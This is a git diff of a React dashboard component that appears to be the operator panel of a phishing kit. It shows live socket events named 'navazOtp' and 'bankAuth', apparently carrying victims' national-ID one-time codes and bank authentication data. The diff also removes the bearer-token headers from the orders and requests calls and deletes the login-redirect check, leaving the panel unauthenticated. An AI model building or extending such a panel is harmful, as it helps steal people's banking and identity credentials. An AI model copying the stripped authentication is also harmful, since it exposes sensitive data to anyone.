@@ -1,5 +1,5 @@
 import React, { useEffect, useState } from 'react'
-import { serverRoute, token } from './App'
+import { serverRoute } from './App'
 import axios from 'axios'
 import Sidebar from './Sidebar'
 import Request from './Request'
@@ -38,13 +38,12 @@ const Main = () => {
     },{})
     const getOrders = async()=>{
       try {
-        const result = await axios.get(serverRoute+'/orders',{headers:{Authorization:`Brear ${token}`}})
+        const result = await axios.get(serverRoute+'/orders')
         setOrders(result.data.orders)
         // console.log(requests)
         
       } catch (error) {
           if(error.response.status === 401){
-            console.log(token)
             // window.localStorage.removeItem('token')
             // window.location.href = '/login'
           }
@@ -57,13 +56,12 @@ const Main = () => {
     },{})
     const getRequests = async()=>{
       try {
-        const result = await axios.get(serverRoute+'/requests',{headers:{Authorization:`Brear ${token}`}})
+        const result = await axios.get(serverRoute+'/requests')
         setRequests(result.data.result)
         // console.log(asdasd)
         
       } catch (error) {
           if(error.response.status === 401){
-            console.log(token)
             // window.localStorage.removeItem('token')
             // window.location.href = '/login'
           }
@@ -101,29 +99,12 @@ const Main = () => {
       setData([{...result,mode:'navazOtp',ref:uniqueNum},...data])
       setPopup(true)
     })
-    useEffect(()=>{
-        if(!localStorage.getItem('token')){
-            window.location.href = '/login'
-        }
-    },[])
     
     socket.on('bankAuth',(result)=>{
       setData([{...result,mode:'bankAuth',ref:uniqueNum},...data])
       setPopup(true)
     })
     const [active,setActive] = useState({nav:'Request',data:{}})
-    const getLink = async()=>{
-      try {
-        const result = await axios.get(serverRoute+'/auth/link',{headers:{'Authorization':`Bearer ${token}`}})
-        setLink(result.data.link)
-      } catch (error) {
-        console.log(error)
-        if(error.response.status===401){
-          localStorage.removeItem('token')
-          window.location.href = '/login'
-        }
-      }
-    }
   return (
     <div className='flex w-full flex-col bg-gray-200 relative h-screen' dir='rtl'  >
         <div className='flex items-center justify-center w-full bg-white py-2' >
